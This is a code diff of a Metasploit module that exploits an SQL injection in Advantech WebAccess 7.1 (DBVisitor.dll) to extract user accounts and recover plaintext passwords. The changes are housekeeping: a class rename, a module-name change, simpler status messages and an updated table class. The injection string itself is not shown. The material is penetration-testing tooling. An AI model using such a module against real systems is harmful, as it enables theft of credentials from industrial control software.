@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -14,7 +14,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Advantech WebAccess SQL Injection',
+      'Name'           => 'Advantech WebAccess DBVisitor.dll ChartThemeConfig SQL Injection',
       'Description'    => %q{
         This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The
         vulnerability exists in the DBVisitor.dll component, and can be abused through malicious
@@ -119,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Exploiting sqli to extract users information...")
+    print_status("Exploiting sqli to extract users information...")
     mark = Rex::Text.rand_text_alpha(8 + rand(5))
     rand = Rex::Text.rand_text_numeric(2)
     separator = Rex::Text.rand_text_alpha(5 + rand(5))
@@ -134,24 +134,24 @@ class Metasploit3 < Msf::Auxiliary
     data = do_sqli(injection, mark)
 
     if data.blank?
-      print_error("#{peer} - Error exploiting sqli")
+      print_error("Error exploiting sqli")
       return
     end
 
     @users = []
     @plain_passwords = []
 
-    print_status("#{peer} - Parsing extracted data...")
+    print_status("Parsing extracted data...")
     parse_users(data, mark, separator)
 
     if @users.empty?
-      print_error("#{peer} - Users not found")
+      print_error("Users not found")
       return
     else
-      print_good("#{peer} - #{@users.length} users found!")
+      print_good("#{@users.length} users found!")
     end
 
-    users_table = Rex::Ui::Text::Table.new(
+    users_table = Rex::Text::Table.new(
       'Header'  => 'Advantech WebAccess Users',
       'Indent'   => 1,
       'Columns' => ['Username', 'Encrypted Password', 'Key', 'Recovered password', 'Origin']
